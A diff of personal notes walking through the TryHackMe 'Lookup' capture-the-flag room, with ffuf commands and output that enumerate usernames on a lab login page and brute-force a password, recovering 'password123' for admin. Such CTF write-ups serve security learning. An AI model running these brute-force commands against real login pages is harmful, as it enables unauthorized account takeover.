@@ -80,7 +80,7 @@ me=FUZZ&password=asdf' -H "Content-Type: application/x-www-form-urlencoded; char
 - fs 74 : 응답 사이즈가 74는 필터링
 
 ┌──(root㉿codespaces-d5df79)-[/usr/share/seclists/Passwords/Common-Credentials]
-└─# ffuf -X POST -u http://lookup.thm/login.php -d 'username=FUZZ&password=a' -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -w 10-million-password-list-top-100000.txt -fs 74 -o /ffuf-passwd.txt
+└─# ffuf -X POST -u http://lookup.thm/login.php -d 'username=FUZZ&password=a' -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -w 10-million-password-list-top-100000.txt -fs 74 -of /ffuf-passwd.txt
 
         /'___\  /'___\           /'___\
        /\ \__/ /\ \__/  __  __  /\ \__/
@@ -111,3 +111,75 @@ me=FUZZ&password=asdf' -H "Content-Type: application/x-www-form-urlencoded; char
 
 admin [Status: 200, Size: 62, Words: 8, Lines: 1, Duration: 192ms]
 jose [Status: 200, Size: 62, Words: 8, Lines: 1, Duration: 194ms]
+
+# found ids
+
+admin, jose
+
+# ffuf admin password123
+
+[/usr/share/seclists/Passwords/Common-Credentials]
+└─# ffuf -u http://lookup.thm/login.php -X POST -d 'username=admin&password=FUZZ' -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -w 10-million-password-list-top-1000000.txt -fs 62 -o /ffuf.login.passwd.txt
+
+        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v2.1.0-dev
+
+---
+
+:: Method : POST
+:: URL : http://lookup.thm/login.php
+:: Wordlist : FUZZ: /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
+:: Header : Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+:: Data : username=admin&password=FUZZ
+:: Follow redirects : false
+:: Calibration : false
+:: Timeout : 10
+:: Threads : 40
+:: Matcher : Response status: 200-299,301,302,307,401,403,405,500
+:: Filter : Response size: 62
+
+---
+
+password123 [Status: 200, Size: 74, Words: 10, Lines: 1, Duration: 191ms]
+
+# ffuf jose can not found the password
+
+┌──(root㉿codespaces-d5df79)-[/usr/share/seclists/Passwords/Common-Credentials]
+└─# ffuf -u http://lookup.thm/login.php -X POST -d 'username=jose&password=FUZZ' -H "Content-type: application/x-www-form-urlencoded; charset=UTF-8" -w /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt
+
+        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v2.1.0-dev
+
+---
+
+:: Method : POST
+:: URL : http://lookup.thm/login.php
+:: Wordlist : FUZZ: /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
+:: Header : Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+:: Data : username=jose&passwod=FUZZ
+:: Output file : /ffuf.jose.passwd.txt
+:: File format : json
+:: Follow redirects : false
+:: Calibration : false
+:: Timeout : 10
+:: Threads : 40
+:: Matcher : Response status: 200-299,301,302,307,401,403,405,500
+:: Filter : Response size: 62
+
+---
+
+:: Progress: [999998/999998] :: Job [1/1] :: 216 req/sec :: Duration: [1:20:13] :: Errors: 1 ::
+
+# login and get a token
